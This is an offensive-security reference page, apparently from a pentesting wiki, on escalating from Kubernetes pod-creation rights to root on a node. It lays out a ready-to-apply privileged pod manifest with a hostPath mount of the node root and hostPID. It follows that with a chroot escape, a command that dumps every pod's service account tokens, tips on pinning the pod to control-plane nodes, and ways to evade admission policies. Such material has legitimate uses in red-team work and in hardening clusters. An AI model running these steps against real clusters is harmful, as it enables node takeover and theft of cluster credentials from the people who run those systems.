---
title: "Pod creation to node: scheduling a pod that owns its worker"
description: "The ability to create pods is close to node root: an attacker schedules a pod that is privileged, mounts the node filesystem with hostPath, or shares host namespaces, then uses it to take over the node and read every pod's secrets. Controllers that create pods (deployments, jobs, daemonsets) grant the same reach indirectly."
keywords:
  - create pods
  - privileged pod
  - hostpath
  - node takeover
  - rbac
---

# Pod creation to node

In Kubernetes, the permission to create pods is nearly equivalent to root on a worker node. Nothing stops the created pod from requesting `privileged: true`, a `hostPath` volume of the node root, or host namespaces, so an attacker who can create pods schedules one of those and escapes to the node it lands on. Permissions that create pods indirectly, through `deployments`, `replicasets`, `jobs`, `cronjobs`, or `daemonsets`, give the same reach, and a daemonset even places a pod on every node at once.

Check the permission, directly or via a controller:

```bash
kubectl auth can-i create pods -n <ns>
kubectl auth can-i create daemonsets -n <ns>          # a pod on every node
kubectl auth can-i create jobs -n <ns>
```

## Schedule a node-owning pod

```bash
cat <<YAML | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata: { name: esc, namespace: <ns> }
spec:
  hostPID: true
  containers:
  - name: c
    image: alpine
    command: ["/bin/sh","-c","sleep 1d"]
    securityContext: { privileged: true }
    volumeMounts: [{ name: n, mountPath: /host }]
  volumes:
  - name: n
    hostPath: { path: / }
YAML
# then exec in and take the node
kubectl exec -it esc -n <ns> -- chroot /host sh
# node root: read every pod's projected token and the kubelet cert
cat /host/var/lib/kubelet/pods/*/volumes/kubernetes.io~projected/*/token 2>/dev/null
```

## Targeting a specific node

```bash
# schedule onto a control-plane node to reach its credentials directly
# add to the pod spec:  nodeName: <control-plane-node>   (or a nodeSelector)
kubectl get nodes -o wide                              # pick the target
```

Pinning `nodeName` to a control-plane node, if your identity can schedule there, lands the pod next to the API server's own credentials.

## Exploitation notes

- Any one of privileged, hostPath `/`, or the runtime socket in the pod spec is sufficient; combine them for reliability. The escape mechanics are [Privileged pod](../pod-escape-to-node/privileged-pod.md) and [hostPath mount](../pod-escape-to-node/hostpath-mount.md).
- Controller create rights (deployment, job, daemonset) count because the controller creates the pod for you; a daemonset is the broadest, placing an attacker pod on every node.
- Pod Security Admission or an admission webhook may reject privileged or hostPath pods; if a restricted policy blocks the obvious spec, try host namespaces alone or a less-flagged field, and see [Admission webhooks](../persistence/admission-webhooks.md).

## References

- [Kubernetes: pod security admission](https://kubernetes.io/docs/concepts/security/pod-security-admission/)
- [BishopFox: bad pods](https://bishopfox.com/blog/kubernetes-pod-privilege-escalation)
- [HackTricks: create pods](https://book.hacktricks.xyz/pentesting-cloud/kubernetes-security/kubernetes-role-based-access-control-rbac)
